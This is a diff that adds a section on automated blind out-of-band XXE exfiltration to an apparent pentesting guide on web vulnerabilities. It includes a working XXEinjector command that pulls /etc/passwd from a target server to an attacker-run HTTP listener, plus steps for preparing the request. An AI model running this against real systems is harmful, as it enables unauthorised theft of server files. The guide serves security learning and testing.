@@ -25,6 +25,7 @@ This document covers common techniques for identifying and exploiting **web vuln
         - [Advanced File Disclosure - CDATA](#advanced-file-disclosure---cdata)
         - [Advanced File Disclosure - Error Based](#advanced-file-disclosure---error-based)
         - [Out-of-band Data Exfiltration](#out-of-band-data-exfiltration)
+        - [Automated Out-of-band Data Exfiltration](#automated-out-of-band-data-exfiltration)
 
 ---
 
@@ -1173,5 +1174,58 @@ echo "<base64 string>" | base64 -d
 ![Filtered output](images/oob3.PNG)
 
 This confirms successful **out-of-band data exfiltration via XXE**, even in a fully blind exploitation scenario.
+
+---
+
+### Automated Out-of-band Data Exfiltration
+
+XXE vulnerabilities, **including out-of-band (OOB) data exfiltration**, can be efficiently automated using specialized tools such as `XXEinjector`. Automation is especially useful when dealing with fully blind XXE vulnerabilities, where manual extraction is slow or impractical.
+
+To begin, clone the `XXEinjector` repository from GitHub and operate from the project directory:
+
+```bash
+git clone https://github.com/enjoiz/XXEinjector.git
+```
+
+In the intercepted HTTP request, insert the following placeholder **immediately after the XML declaration**:
+
+```
+XXEINJECT
+```
+
+This placeholder acts as a **marker** that tells the tool where to inject its payload.
+
+Only include the XML declaration followed by the placeholder. The full XML document should **not** be present in the request:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+  XXEINJECT
+```
+
+![Filtered output](images/automated-oob.png)
+
+Save the modified request to a file (e.g., `req.txt`).
+
+The following command performs the same **fully blind OOB XXE attack** demonstrated in the previous section, targeting `/etc/passwd`:
+
+```bash
+ruby XXEinjector.rb --host=IP --httpport=8001 --file=req.txt --path=/etc/passwd --oob=http --phpfilter
+```
+
+All exfiltrated data is automatically stored in the tool’s log directory:
+
+```
+/XXEinjector/Logs
+```
+
+In this case, the extracted file is saved as:
+
+```
+/XXEinjector/Logs/passwd.log
+```
+
+![Filtered output](images/automated-oob2.png)
+
+This confirms successful **automated out-of-band data exfiltration** via XXE.
 
 ---
